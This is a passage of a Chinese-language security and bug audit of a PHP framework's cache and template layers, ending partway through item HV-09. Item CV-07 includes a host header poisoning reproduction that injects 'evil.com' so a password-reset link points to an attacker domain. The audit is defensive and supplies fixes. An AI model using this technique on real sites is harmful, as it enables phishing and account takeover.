# LightPHP 缓存层与视图层代码审计报告

- **审计范围**：`app/cache/`（FileCache / RedisCache / MemcachedCache / TaggedCache / CacheManager / Cache）、`app/core/contract/CacheInterface.php`、`app/view/`（Blade / View / Smarty / SmartyView / Helper / test.php）
- **基线提交**：`f2dd2a2670cc5d3ffd2e78fe0a64e490feb5df50`（分支 `cline/55bfe`）
- **审计方法**：逐行静态审计 + PHP 8.4 CLI 实证复现（临时脚本置于系统临时目录，未改动仓库任何文件）
- **发现统计**：严重 8 项、高危 19 项、中危 16 项、低危 12 项，合计 **55 项**（全部条目已完整列出，无省略）
- **复现方式**：临时 PHP 脚本置于系统临时目录并直接 `require` 目标类文件（绕开框架引导），**未修改仓库任何文件**

> 复现环境说明：本机 PHP 8.4.7 **未安装 redis / memcached 扩展**，涉及 `RedisCache`、`MemcachedCache` 的运行时行为结论均来自代码路径推演，并已在条目中显式标注；其余条目均已实测复现并给出实测输出。

## 目录

- [一、严重缺陷（8）](#一严重缺陷8)
- [二、高危缺陷（19）](#二高危缺陷)
- [三、中危缺陷（16）](#三中危缺陷)
- [四、低危缺陷（12）](#四低危缺陷)
- [五、修复优先级建议](#五修复优先级建议)
- [六、已验证正确清单](#六已验证正确清单)

---

## 一、严重缺陷（8）

### [严重] CV-01 指令正则强制 `@name(` 紧邻左括号，`@if (` 空格写法直接编译成 ParseError
- 文件: `app/view/Blade.php` 行号: 307-314（`compileBalanced`）、239-258（指令表）、381/406/442/223（其余正则）
- 代码:
```php
private function compileBalanced(string $content, string $directive, string $prefix, string $suffix): string
{
    return (string) preg_replace_callback(
        '/@' . preg_quote($directive, '/') . '\(((?:[^()]++|\((?1)\))*+)\)/s',
        fn ($m) => $prefix . $m[1] . $suffix,
        $content
    );
}
```
- 问题: 正则在指令名与 `(` 之间**没有 `\s*`**，而 Laravel Blade 与本项目文档（`docs/guide.md`）的习惯写法都是 `@if ($cond)`。带空格时 `@if (` 不被编译、原文保留；随后 `@endif` 被替换为 `<?php endif; ?>`，生成文件语法错误。`@foreach`、`@for`、`@while`、`@section`、`@include`、`@extends`、`@push`、`@unless`、`@isset`、`@empty`、`@switch`、`@env`、`@method` 全部受影响；`@include`(406)、`@each`(442)、自定义指令(381)、`@json`(223) 同样缺少 `\s*`。
- 触发场景: 模板 `hello.blade.php`：
```blade
@if ($user->isActive())
    <p>{{ $user->name }}</p>
@endif
```
```php
$b = new view\Blade(VIEW_PATH, STORAGE_PATH.'views/');
$b->render('hello', ['user' => $user]);
```
实测输出：`ParseError: syntax error, unexpected token "endif", expecting end of file`；`@foreach ($l as $i)` 同理报 `unexpected token "endforeach"`。
- 建议修复: 在 `compileBalanced` 及 `compileIncludes`/`compileEach`/`compileDirectives`/`@json` 的正则中，于指令名与括号之间补 `[ \t]*`：
```php
'/@' . preg_quote($directive, '/') . '\s*\(((?:[^()]++|\((?1)\))*+)\)/s'
```
同时给指令名补 `(?![\w])` 边界，避免 `@ifx` 被误匹配；`\s*` 会吞换行，用 `[ \t]*` 更保守。

---

### [严重] CV-02 无边界守卫的 `@endif/@endforeach/@endphp/...` 命中模板普通文本
- 文件: `app/view/Blade.php` 行号: 264-291
- 代码:
```php
$statements = [
    '@php(?!\w)'   => '<?php ',
    '@endphp'      => '?>',                  // 无守卫
    '@else(?!\w)'  => '<?php else: ?>',      // 有守卫
    '@endif'       => '<?php endif; ?>',     // 无守卫
    '@endforeach'  => '<?php endforeach; ?>',// 无守卫
    ...
];
foreach ($statements as $pattern => $replacement) {
    $content = (string) preg_replace('/' . $pattern . '/', $replacement, $content);
}
```
- 问题: `@else`、`@php`、`@csrf` 等带 `(?!\w)` 守卫，但**所有 `@endxxx`（11 个）与 `@endif`、`@default`、`@endswitch`、`@break`、`@continue` 缺少 `(?!\w)` 边界**。任何以 `@` 开头、后接这些单词的普通文本都会被替换：支持邮箱（`foo@endif.com`）、文档片段、JS 注解、HTML 注释中的说明文字均会触发。
- 触发场景: `contact.blade.php`：`contact: support@endif.com`
```php
$b->render('contact');
```
实测输出：`Parse error: syntax error, unexpected token "endif", expecting end of file`。该模式也会破坏 `@php ... @endphp` 块内出现的同名文本。
- 建议修复: 为所有无守卫模式统一补词边界，例如 `'@endif(?![\w])' => '<?php endif; ?>'`；更稳妥的做法是改为统一词法扫描 `/\B@([a-zA-Z]+)/`，仅当命中已知指令表时才替换，从根本上杜绝文本误伤。

---

### [严重] CV-03 `MemcachedCache::clear()` 调用 `flush()` 清空整台 Memcached 服务器
- 文件: `app/cache/MemcachedCache.php` 行号: 123-128
- 代码:
```php
public function clear(): bool
{
    // 注意：flush() 会清空 Memcached 服务器上的所有数据（包括其他应用的数据）
    // 如果与其他应用共享 Memcached 实例，应改用逐键删除的方式
    return $this->memcached->flush();
}
```
- 问题: `flush()` 是协议级 **flush_all**，作用域是整个服务器实例，与 `$this->prefix` 无关。共享实例（多应用/多环境共用 `127.0.0.1:11211` 是极常见部署形态）下一次 `Cache::clear()` 会清掉其他应用全部数据。注释已识别风险但未修复；`CacheManager::__call` 又把该方法直通到默认驱动，执行路径毫无阻隔。
- 触发场景: 同一 Memcached 实例部署 `site-a`、`site-b`：
```php
// site-a 的运维脚本 / 队列任务 / 测试用例
\cache\Cache::clear();
// site-b 的全部缓存在 site-a 进程内被连带清空 → 全量回源 DB
```
- 建议修复: Memcached 无 key 遍历能力，应显式区分独占/共享实例：
```php
public function clear(): bool
{
    if (!$this->ownsInstance) {   // 构造时按 config('memcached.shared') 或显式白名单判定
        throw new \RuntimeException('Refuse to flush a shared Memcached instance; delete by prefix instead');
    }
    return $this->memcached->flush();
}
```
并在 `CacheInterface::clear()` 与 `docs/api.md` 中明确：`clear()` 的作用域是**本 store 前缀**，独占实例下才允许降级为 `flush()`。

### [严重] CV-04 Blade 编译缓存非原子写入，并发请求可 `require` 到半截 PHP 文件
- 文件: `app/view/Blade.php` 行号: 154-179（`compile()`）、113-146（`renderTemplate()`）
- 代码:
```php
// compile()
if (file_put_contents($cacheFile, $compiled, LOCK_EX) === false) {
    trigger_error("Blade: Failed to write compiled template cache: {$cacheFile}", E_USER_WARNING);
}

// renderTemplate()
if (!file_exists($cacheFile)) { ... return ''; }
require $cacheFile;
```
- 问题: `LOCK_EX` 只对**写入方**互斥，`require` 是无锁读；`$cacheFile` 由模板名固定派生（`sha256($template).php`）。请求 A 正在写入时，请求 B/C 的 `file_exists()` 判定文件存在并立即 `require`，读到不完整内容 → `ParseError`。更严重的是：进程在写入中途被 kill 会留下**永久性半截缓存文件**，此后 `isCacheFresh()` 因 `cacheMtime >= sourceMtime` 恒判定"新鲜"，每次渲染都 fatal，重启无法自愈。对比：`FileCache::write()`（163-171 行）已正确使用"临时文件 + rename"，Blade 未复用该模式。
- 触发场景: 新部署后并发访问同一模板：
```php
// 模板缓存目录为空时，10 个并发请求同时 render('index')
for ($i = 0; $i < 10; $i++) { async_get('http://127.0.0.1/index'); }
```
现象为偶发 `Parse error ... in /storage/views/<sha256>.php`，且持久复现（半截文件已落盘）。
- 建议修复: 采用 FileCache 同款原子写入（tmp + rename）：
```php
$tmp = $cacheFile . '.' . bin2hex(random_bytes(8)) . '.tmp';
if (file_put_contents($tmp, $compiled, LOCK_EX) === false) {
    @unlink($tmp);
    trigger_error("Blade: Failed to write compiled template cache: {$cacheFile}", E_USER_WARNING);
    return;
}
if (!@rename($tmp, $cacheFile)) {   // 同目录 rename 在 POSIX 与 NTFS 均为原子替换
    @unlink($tmp);
    trigger_error("Blade: Failed to publish compiled template: {$cacheFile}", E_USER_WARNING);
}
```
并在 `isCacheFresh()` 前调用 `clearstatcache()`，避免同进程 stat 缓存误判。

---

### [严重] CV-05 `View::extend()` 对当前层缓冲区 `ob_clean()`，位于 `startSection()` 内时摧毁区块并导致整页空白
- 文件: `app/view/View.php` 行号: 225-252（`extend()`）、182-186（`startSection()`）
- 代码:
```php
public function extend(string $layout): void
{
    ...
    if (file_exists($layoutFile)) {
        if (!$this->validatePath($layoutFile)) { throw new \RuntimeException(...); }
        if (ob_get_level() > 0) {
            ob_clean();                      // 清空"当前"层，而非本视图根缓冲区
        }
        $this->extendDepth++;
        try {
            extract($this->renderData, EXTR_SKIP);
            $__view = $this;
            require $layoutFile;             // 无 ob_start()，布局输出直接落到调用方缓冲
        } finally { $this->extendDepth--; }
    }
}
```
- 问题: `extend()` 假定自己运行在 `render()` 开启的那一层缓冲区。当 `extend()` 在 `startSection()` 内部被调用（先定义区块再声明布局，或布局内部再 `extend()`），`ob_clean()` 会**丢弃区块已缓冲的内容**；同时 `extend()` 自身没有 `ob_start()`，布局输出直接落到 `render()` 的根缓冲，`render()` 结尾 `while (ob_get_level() > $initialObLevel + 1)` 的清理逻辑会把布局内容一并 `ob_end_clean()` 丢弃 → 返回空串。
- 触发场景: `child.php`（`extend` 误置于 section 内，未先 `endSection()`）：
```php
<?php $__view->startSection('body'); ?>
SECTION
<?php $__view->extend('layout'); ?>
```
```php
(new view\View($dir))->render('child');
```
实测输出：`[]` —— 整页空白，`SECTION` 内容丢失。对照正确写法（先 `endSection()` 再 `extend()`）实测输出为 `L[BODY]`。
- 建议修复: 用"视图根缓冲层级"标记取代 `ob_clean()`，并让 `extend()` 在独立子缓冲区内执行：
```php
private int $rootObLevel = 0;

public function render(string $template, array $data = []): string
{
    $this->rootObLevel = ob_get_level();
    ob_start();
    try { require $__file; }
    finally {
        while (ob_get_level() > $this->rootObLevel) { ob_end_clean(); }
        $this->renderData = [];
    }
}

public function extend(string $layout): void
{
    $level = ob_get_level();
    ob_start();
    try {
        extract($this->renderData, EXTR_SKIP);
        $__view = $this;
        require $layoutFile;
        $out = (string) ob_get_clean();
        if ($level > $this->rootObLevel) { ob_clean(); }  // 仅丢弃子视图残留输出
        echo $out;
    } catch (\Throwable $t) {
        while (ob_get_level() > $level) { ob_end_clean(); }
        throw $t;
    }
}
```

### [严重] CV-06 `View::render()` 异常路径不重置 `renderData`，敏感数据滞留至下一次渲染
- 文件: `app/view/View.php` 行号: 104-129
- 代码:
```php
$this->renderData = $data;                       // 107
unset($file, $data, $template);

$initialObLevel = ob_get_level();
ob_start();
extract($__data, EXTR_SKIP);
try {
    require $__file;
} catch (\Throwable $t) {
    while (ob_get_level() > $initialObLevel) { ob_end_clean(); }
    throw $t;                                    // renderData 未清空
}
while (ob_get_level() > $initialObLevel + 1) { ob_end_clean(); }
$content = ob_get_clean();
$this->renderData = [];                          // 仅成功路径清空
```
- 问题: `renderData` 只在成功路径被重置。视图抛出异常后，上一次（含敏感字段）的视图数据残留在 `$this->renderData` 中，而 `extend()`（245 行）正是从这里 `extract()`。同一 `View` 实例若被复用（控制器静态持有、视图合成器闭包捕获、队列/长驻进程复用），后续 `extend()` 会读到上一请求的数据，构成跨请求数据泄露。此外 `$initialObLevel` 取自 `ob_start()` 之前，`+1` 硬编码假设恰好一层缓冲，若模板内又开缓冲则会误清调用方缓冲区。
- 触发场景:
```php
$view = new view\View($dir);
put("$dir/d.php", "<?php throw new \\RuntimeException('boom'); ?>");
try { $view->render('d', ['secret' => 'S']); } catch (\Throwable $e) {}
// 反射读取 renderData 实测： {"secret":"S"}  —— 敏感数据滞留
$view->extend('layout');   // 布局会读到上一请求的 secret
```
- 建议修复: 用 `finally` 统一收口，保证 `renderData` 必定重置：
```php
$initialObLevel = ob_get_level();
ob_start();
try {
    extract($__data, EXTR_SKIP);
    require $__file;
    while (ob_get_level() > $initialObLevel + 1) { ob_end_clean(); }
    $content = ob_get_clean();
    return $content === false ? '' : $content;
} catch (\Throwable $t) {
    while (ob_get_level() > $initialObLevel) { ob_end_clean(); }
    throw $t;
} finally {
    $this->renderData = [];
    $this->currentSection = '';
    $this->extendDepth = 0;
}
```

---

### [严重] CV-07 `Helper::url()` 信任 `HTTP_HOST`，存在主机头投毒
- 文件: `app/view/Helper.php` 行号: 41-48
- 代码:
```php
public static function url(string $path = ''): string
{
    $scheme = (($_SERVER['HTTPS'] ?? 'off') === 'on') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $host = preg_replace('/[^a-zA-Z0-9.:-]/', '', $host);
    $base = rtrim(dirname($_SERVER['SCRIPT_NAME'] ?? ''), '/');
    return "{$scheme}://{$host}{$base}/" . ltrim($path, '/');
}
```
- 问题: `HTTP_HOST` 完全由客户端可控；正则只剔除 `[^a-zA-Z0-9.:-]`，**字母、数字、点、冒号、短横线全部放行**，`evil.com`、`attacker.com:8080` 等任意主机名可注入。该值常用于密码重置链接、邮件模板、OAuth 回调、`Location` 跳转，构成 Host Header Injection / 缓存投毒（页面被 CDN 或 `OutputCache` 缓存时，污染会放大为对所有用户的持久钓鱼链接）。同时未识别反向代理的 `X-Forwarded-Proto`，HTTPS 站点会生成 `http://` 链接。
- 触发场景:
```php
$_SERVER['HTTP_HOST'] = 'evil.com';
view\Helper::url('/reset?token=abc');
// 实测输出： https://evil.com/reset?token=abc   —— 密码重置链接指向攻击者域名
```
- 建议修复: 改为以配置为唯一可信来源：
```php
public static function url(string $path = ''): string
{
    $base = rtrim(config('app.url', 'http://localhost'), '/');   // 唯一可信来源
    $script = rtrim(dirname($_SERVER['SCRIPT_NAME'] ?? ''), '/');
    return $base . $script . '/' . ltrim($path, '/');
}
```
若必须支持多域名，须与 `config('app.allowed_hosts')` 严格 `in_array()` 比对，未命中应抛异常而非静默降级。

---

### [严重] CV-08 `FileCache::delete()` 删除锁文件，破坏 `flock` 互斥；`clear()` 同样删除他进程持有的锁
- 文件: `app/cache/FileCache.php` 行号: 223-232（`delete`）、253-277（`clear`）
- 代码:
```php
public function delete(string $key): bool
{
    $file = $this->getFile($key);
    if (file_exists($file)) {
        $lockFile = $this->getLockFile($key);
        @unlink($lockFile);          // 正在被其它进程 flock 持有的锁文件被删除
        return @unlink($file);
    }
    return true;
}

public function clear(): bool
{
    // ...
    $lockFiles = @glob($this->path . '*.lock');
    foreach ($lockFiles as $file) { @unlink($file); }   // 同上，一次击穿全站
}
```
- 问题: `flock` 绑定的是**文件描述符/inode**。POSIX 下 `unlink` 一个已被 `flock` 的锁文件会立刻成功，另一个进程随后 `fopen` 同一路径会**创建新 inode 并成功获得锁** —— 此刻两个进程同时认为自己独占该 key，计数器丢失更新、`remember()` 击穿。`increment()`/`decrement()`/`remember()` 的正确性完全依赖这把锁。Windows 下 `unlink` 被占用文件失败（实测 `Permission denied`），锁文件残留，语义同样不正确。`clear()` 一次性删除目录下所有 `.lock`，把全站所有 key 的互斥同时击穿。
- 触发场景:
```php
$cache = new cache\FileCache(STORAGE_PATH.'cache');
$cache->set('ctr', 5, 0);
// 进程 A：
$fp = fopen($lockPath, 'c+'); flock($fp, LOCK_EX);
// 进程 B（任意请求）：$cache->delete('ctr');   // unlink 锁文件
// 进程 C：fopen($lockPath,'c+') → 新 inode → flock 立即成功 → A 与 C 同时进入临界区
```
实测（Windows）：`unlink` 抛 `Permission denied`，锁文件残留；POSIX 下则出现锁失效竞态。
- 建议修复: ① 删除数据文件时**不要**删除锁文件，锁文件交由 `clear()` 或独立 GC 命令按 mtime（如 `> 1 天`）回收；② `clear()` 删除锁文件前用 `filemtime()` 过滤陈旧锁；③ 若坚持删除，至少在删除后重建空锁文件并接受该 key 的"无锁窗口"。首选方案 ①。

## 二、高危缺陷

### [高] HV-01 Blade 未闭合 `@section` 泄漏 ob 缓冲区，吞掉后续全部输出
- 文件: `app/view/Blade.php` 行号: 498-521（`startSection`/`endSection`）、126-145（`renderTemplate`）
- 代码:
```php
public function startSection(string $name): void
{
    $this->stack[] = $name;
    ob_start();                 // 无对应 endSection 时永不关闭
}
...
$content = ob_get_clean();     // 140 行：只关闭最内层（泄漏的 section 缓冲）
```
- 问题: `renderTemplate()` 仅在**异常路径**（135-138 行）回收缓冲区，正常路径只 `ob_get_clean()` 一层。模板写了 `@section('x')` 却漏写 `@endsection` 时，section 缓冲永不关闭，`renderTemplate()` 返回的"内容"其实是该 section 的内容，而 `render()` 自己的缓冲层泄漏到全局，导致后续所有输出（含控制器后续输出、错误信息）被吞没。`View::render()` 在 122-125 行专门做了"清理孤立输出缓冲区"，Blade 完全没有对应逻辑。
- 触发场景: `orphan.blade.php`：
```blade
A@section('x')BODY
```
```php
$out = $b->render('orphan');
echo "AFTER: still alive\n";
```
实测：`render()` 返回空串，且 `echo "AFTER..."` 被吞入泄漏的缓冲区，整个请求**零输出**（真实站点表现为白屏）。
- 建议修复: 在 `renderTemplate()` 成功路径补齐孤立缓冲回收，并让 `endSection()` 与缓冲区层级一一对应：
```php
$initialObLevel = ob_get_level();
if (!ob_start()) { return ''; }
try {
    $__blade = $this;
    extract($data, EXTR_SKIP);
    require $cacheFile;
    while (ob_get_level() > $initialObLevel + 1) { ob_end_clean(); }  // 丢弃未闭合的 section 缓冲
    $content = ob_get_clean();
} catch (\Throwable $t) {
    while (ob_get_level() > $initialObLevel) { ob_end_clean(); }
    throw $t;
}
```
同时 `startSection()` 记录开启层级（`$this->obLevels[$name] = ob_get_level() - 1`），`endSection()` 只关闭到该层级。

---

### [高] HV-02 `@include` 无递归深度限制，自包含模板导致内存耗尽 fatal
- 文件: `app/view/Blade.php` 行号: 402-431（`compileIncludes`）、603-618（`resolveInclude`）
- 代码:
```php
return '<?php $__prevSections_' . $suffix . ' = $__blade->getSections(); ... '
     . 'if ($__inc_' . $suffix . ' = $__blade->resolveInclude(\'' . addslashes($view) . '\')) { ... require $__inc_' . $suffix . '; } ...';
```
- 问题: `resolveInclude()` 只做"是否存在 + 是否新鲜 + 是否在缓存目录内"三项检查，**没有任何递归深度计数**。`render()` 对 `@extends` 做了 `$rendered` 数组去重与异常抛出（94-105 行），`@include` 与 `@each` 则完全没有等价保护。模板 A 包含自身（或 A→B→A）会无限 `require`，直接耗尽内存并产生 `Allowed memory size exhausted` 致命错误。
- 触发场景: `rec.blade.php`：
```blade
R@include('rec')
```
```php
(new view\Blade($dir, $cache))->render('rec');
```
实测输出：`Fatal error: Allowed memory size of 134217728 bytes exhausted`。该 fatal 发生在模板作用域内，**无法被 `renderTemplate()` 的 `catch (\Throwable)` 捕获**，异常处理器与输出缓存中间件均无法兜底，进程直接终止。
- 建议修复: 引入 include 深度计数：
```php
private int $includeDepth = 0;
private const MAX_INCLUDE_DEPTH = 64;

public function resolveInclude(string $view): string
{
    if ($this->includeDepth >= self::MAX_INCLUDE_DEPTH) {
        throw new \RuntimeException("Blade: Maximum include depth exceeded at '{$view}' (recursive @include?)");
    }
    // ...原有检查
}
```
在 `renderTemplate()` 的 `require` 前后 `$this->includeDepth++/--`，并在 `render()` 中重置该计数。

---

### [高] HV-03 模板文件被删除后仍持续渲染旧的编译缓存
- 文件: `app/view/Blade.php` 行号: 117-124（`renderTemplate`）、154-179（`compile`）、477-489（`isCacheFresh`）
- 代码:
```php
if (!$this->isCacheFresh($template, $cacheFile)) {
    $this->compile($template, $cacheFile);     // 失败时仅 trigger_error，静默返回 void
}
if (!file_exists($cacheFile)) {                  // 旧缓存仍存在 → 继续 require
    trigger_error(...); return '';
}
require $cacheFile;
```
- 问题: `compile()` 返回 `void`，失败时（源文件不存在、路径遍历被拒、写盘失败）仅 `trigger_error` 后 `return`。`renderTemplate()` 随后只检查 `file_exists($cacheFile)`，而**历史编译缓存文件仍然存在**，于是继续 `require` 旧代码。删除模板、下线页面、回滚部署都无法让旧产物失效；安全影响是含敏感内容或后门逻辑的模板即使被删除，站点仍持续输出。
- 触发场景:
```php
file_put_contents("$dir/d.blade.php", "OLD");
echo (new view\Blade($dir, $cache))->render('d');   // 实测： [OLD]
unlink("$dir/d.blade.php");
echo (new view\Blade($dir, $cache))->render('d');   // 实测： [OLD]  —— 源文件已删除仍渲染
```
- 建议修复: 编译失败必须让调用方感知，并主动失效旧缓存：
```php
private function compile(string $template, string $cacheFile): bool
{
    // ...任何失败分支：@unlink($cacheFile); return false;
    return true;
}

public function renderTemplate(string $template, array $data = []): string
{
    if (!$this->isCacheFresh($template, $cacheFile)
        && !$this->compile($template, $cacheFile)) {
        throw new \RuntimeException("Blade: Failed to compile template '{$template}'");
    }
    if (!file_exists($cacheFile)) {
        throw new \RuntimeException("Blade: Compiled cache missing for '{$template}'");
    }
    ...
}
```

### [高] HV-04 `isCacheFresh()` 用秒级 mtime 比较，同秒修改的模板不会重编译
- 文件: `app/view/Blade.php` 行号: 477-489
- 代码:
```php
$cacheMtime  = filemtime($cacheFile);
$sourceMtime = filemtime($sourcePath);
if ($cacheMtime === false || $sourceMtime === false) { return false; }
return $cacheMtime >= $sourceMtime;
```
- 问题: 文件系统 mtime 精度为 1 秒（NTFS 与多数 ext4 均如此），`>=` 判定在"同一秒内先渲染、后修改源文件"时两者相等 → 判定为新鲜 → **继续使用旧编译产物**。开发期表现为"改了模板刷新没反应"，生产期表现为 `git checkout`/部署脚本批量落盘后缓存未失效；叠加 CV-04 的半截文件（mtime 已更新），该状态可持久化。
- 触发场景:
```php
file_put_contents("$dir/m.blade.php", "V1");
$b = new view\Blade($dir, $cache);
echo $b->render('m');                       // 实测： V1
file_put_contents("$dir/m.blade.php", "V2"); // 同一秒内修改
clearstatcache();
echo $b->render('m');                       // 实测： V1  —— 期望 V2
touch("$dir/m.blade.php", time() + 5);
echo $b->render('m');                       // 实测： V2  —— mtime 推进后才重编译
```
- 建议修复: 引入内容指纹，摆脱时间精度依赖（在编译产物首行写入源文件哈希）：
```php
private function isCacheFresh(string $template, string $cacheFile): bool
{
    $sourcePath = $this->templatePath . $template . '.blade.php';
    if (!file_exists($cacheFile) || !file_exists($sourcePath)) { return false; }
    $head = (string) @file_get_contents($cacheFile, false, null, 0, 96);
    return str_starts_with($head, '<?php /*' . hash_file('sha256', $sourcePath) . '*/');
}
```
若要保留 mtime 快速路径，至少把 `>=` 改为 `>`，并在编译成功后 `touch($cacheFile, time() + 1)` 主动推进缓存时间戳。

---

### [高] HV-05 `renderTemplate()` 的 `extract($data, EXTR_SKIP)` 与局部变量同名冲突，视图变量被静默丢弃
- 文件: `app/view/Blade.php` 行号: 113-146（`renderTemplate`）
- 代码:
```php
private function renderTemplate(string $template, array $data = []): string
{
    $cacheFile = $this->getCachePath($template);
    $initialObLevel = ob_get_level();
    ...
    $__blade = $this;
    extract($data, EXTR_SKIP);      // 132 行
    require $cacheFile;
}
```
- 问题: `EXTR_SKIP` 要求"已存在的变量不被覆盖"，而 `renderTemplate()` 作用域内已存在 `$template`、`$data`、`$cacheFile`、`$content`、`$initialObLevel`、`$__blade`。任何以这些名字命名的视图变量（`content`、`template`、`data`、`cacheFile` 在真实业务中极常见）**不会进入模板**，模板读到的是框架内部变量。`View::render()` 通过 `unset($file, $data, $template)`（108 行）规避了同类问题，Blade 未做等价处理；且未 unset 的 `$content` 在 `renderTemplate()` 末尾才被赋值，冲突窗口覆盖整个 `require`。
- 触发场景:
```php
file_put_contents("$dir/collide.blade.php",
    "content=[<?= \$content ?? 'EMPTY' ?>] cacheFile=[<?= \$cacheFile ?? 'EMPTY' ?>] template=[<?= \$template ?? 'EMPTY' ?>]");
$b->render('collide', ['content' => 'USER', 'cacheFile' => 'USER', 'template' => 'USER']);
```
实测输出：`content=[EMPTY] cacheFile=[C:\...\views\acd9e56b....php] template=[collide]` —— 三个传入变量全部未生效，其中 `cacheFile` 进一步**把服务器绝对路径泄露到模板输出中**。
- 建议修复: 将内部变量统一加下划线前缀并在 `extract` 前释放，再改用 `EXTR_OVERWRITE`：
```php
private function renderTemplate(string $__tpl, array $__data = []): string
{
    $__cacheFile = $this->getCachePath($__tpl);
    $__level = ob_get_level();
    if (!ob_start()) { return ''; }
    try {
        $__blade = $this;
        extract($__data, EXTR_OVERWRITE);   // 模板数据优先，内部变量已重命名，不会被覆盖
        require $__cacheFile;
        ...
    }
}
```
更稳妥的做法是像 Laravel 一样用 `$__env`/`$__data` + 显式变量映射，避免 `extract` 的全局语义。

---

### [高] HV-06 `@include` 使用 `extract(..., EXTR_SKIP)`，include 数据无法覆盖同名变量且变量反向泄漏
- 文件: `app/view/Blade.php` 行号: 427（`compileIncludes` 生成代码）
- 代码:
```php
return '<?php $__prevSections_' . $suffix . ' = $__blade->getSections(); ... '
     . 'if ($__inc_' . $suffix . ' = $__blade->resolveInclude(\'' . addslashes($view) . '\')) '
     . '{ extract(' . $vars . ', EXTR_SKIP); require $__inc_' . $suffix . '; } '
     . '$__blade->restoreState($__prevSections_' . $suffix . ', $__prevStack_' . $suffix . '); ?>';
```
- 问题: 两个方向的问题。① `EXTR_SKIP` 使 include 传入的数据**无法覆盖调用方已定义的同名变量**：被包含模板拿到的是外层旧值，行为反直觉且是隐蔽 bug；② `require`（非 `require_once`）且未做作用域隔离，被包含模板内定义的变量**全部泄漏到调用方作用域**，后续逻辑可能读到子模板的中间变量。`$__prevSections_N`/`$__prevStack_N`/`$__inc_N` 三个内部变量同样泄漏。
- 触发场景:
```php
file_put_contents("$dir/inc.blade.php",  "inc sees item=[<?= \$item ?? 'UNSET' ?>]");
file_put_contents("$dir/parent.blade.php",
  "@php \$item = 'OUTER'; @endphp@include('inc', ['item' => 'INNER'])");
echo $b->render('parent');
// 实测： inc sees item=[OUTER]   —— include 数据 'INNER' 被丢弃
```
```php
file_put_contents("$dir/inc2.blade.php",  "<?php \$leaked = 'YES'; ?>");
file_put_contents("$dir/parent2.blade.php", "@include('inc2')after=[<?= \$leaked ?? 'UNSET' ?>]");
echo $b->render('parent2');
// 实测： after=[YES]   —— 子模板变量泄漏到父模板
```
- 建议修复: 用闭包隔离作用域，并让数据优先：
```php
$__incScope = function ($__blade, array $__vars, string $__file) {
    extract($__vars, EXTR_OVERWRITE);
    require $__file;
};
// 生成：$__incScope($__blade, [数据], $__inc_N);
```
或使用 `(static function () use ($__vars, $__inc_N) { extract($__vars, EXTR_OVERWRITE); require $__inc_N; })();`

### [高] HV-07 `View` 自动转义与 `Helper::e()` 叠加造成双重转义
- 文件: `app/view/View.php` 行号: 100-102、160-175（`escapeArray`）；`app/view/Helper.php` 行号: 8-11
- 代码:
```php
if ($this->autoEscape) {
    $data = $this->escapeArray($data);       // 渲染前对全部字符串递归转义
}
```
```php
public static function e(mixed $value): string
{
    return htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}
```
- 问题: 数据在进入模板**之前**已被 `htmlspecialchars`，模板内再调用 `Helper::e()`（`docs/guide.md:1999` 明确要求开发者这样写）会二次转义：`&` → `&amp;` → `&amp;amp;`，URL、查询串、富文本摘要全部出现可见的 `&amp;` 字面量。同时"渲染前转义"本身破坏模板语义：数据用于逻辑判断、属性拼接、JSON 输出、`implode(',', $tags)` 时都会被污染；且与 Blade 的"输出时转义"策略行为不一致，跨引擎迁移时既是显示缺陷也是隐性 XSS 温床。
- 触发场景:
```php
file_put_contents("$dir/a.php", "<?= \$content ?>|<?= view\\Helper::e(\$content) ?>");
echo (new view\View($dir))->render('a', ['content' => '<b>x</b>']);
// 实测： &lt;b&gt;x&lt;/b&gt;|&amp;lt;b&amp;gt;x&amp;lt;/b&amp;gt;
```
- 建议修复: 二选一并全局统一，推荐改为"输出时转义"（与 Blade 一致）：
```php
// View.php：删除 render() 中的 escapeArray 调用
// 模板侧统一使用 <?= \view\Helper::e($value) ?> 与 <?= $__view->html($raw) ?>
```
若必须保留自动转义，则应：① 将 `Helper::e()` 改为幂等实现（对已转义实体不再二次转义）；② 文档明确"数据已转义，模板内禁止再次转义"；③ `escapeArray()` 跳过 `HtmlString` 之类的原始 HTML 值对象。

---

### [高] HV-08 `View::startSection()` 用单一 `currentSection` 而非栈，嵌套区块错乱
- 文件: `app/view/View.php` 行号: 24、182-206
- 代码:
```php
private string $currentSection = '';        // 单值，非栈

public function startSection(string $name): void
{
    $this->currentSection = $name;         // 内层覆盖外层
    ob_start();
}

public function endSection(): void
{
    if ($this->currentSection === '') { return; }   // 无区块时直接 return，不关缓冲
    $content = ob_get_clean();
    $this->sections[$this->currentSection] .= $content;
    $this->currentSection = '';
}
```
- 问题: 嵌套 `startSection()` 会让 `currentSection` 被内层覆盖；第一次 `endSection()` 关闭的是**外层**缓冲，却把内容写进**内层**区块名，随后 `currentSection` 被清空，第二个 `endSection()` 直接 return —— 外层区块内容丢失、内层区块名错配。`Blade` 用 `$this->stack` 正确处理了同一问题（498-521 行），两引擎行为不一致。此外 `endSection()` 在无区块时不关闭任何缓冲，与 `ob_start()` 不配对时会静默吞掉内容。
- 触发场景:
```php
<?php $__view->startSection('outer'); ?>OUTER<?php
    $__view->startSection('inner'); ?>INNER<?php $__view->endSection(); ?>
<?php $__view->endSection(); ?>
echo $__view->yield('outer') . '|' . $__view->yield('inner');
```
实测：`yield('outer')` 为空、`yield('inner')` 得到 `INNER`（外层内容 `OUTER` 丢失）。
- 建议修复: 改为栈结构，与 Blade 保持一致：
```php
/** @var string[] */
private array $sectionStack = [];

public function startSection(string $name): void
{
    $this->sectionStack[] = $name;
    ob_start();
}

public function endSection(): void
{
    if ($this->sectionStack === []) { return; }
    $name = array_pop($this->sectionStack);
    $content = (string) ob_get_clean();
    $this->sections[$name] = ($this->sections[$name] ?? '') . $content;
}
```
`include()`（262-277 行）的状态快照也需把 `sectionStack` 纳入。

---

### [高] HV-09 `View::extend()` 在渲染根缓冲之外被调用时直接写入全局输出
- 文件: `app/view/View.php` 行号: 225-252
- 代码:
```php
if (ob_get_level() > 0) { ob_clean(); }
$this->extendDepth++;
try {
    extract($this->renderData, EXTR_SKIP);
    $__view = $this;
    require $layoutFile;          // 无 ob_start()：输出直接进入当前最内层缓冲
} finally { $this->extendDepth--; }
```
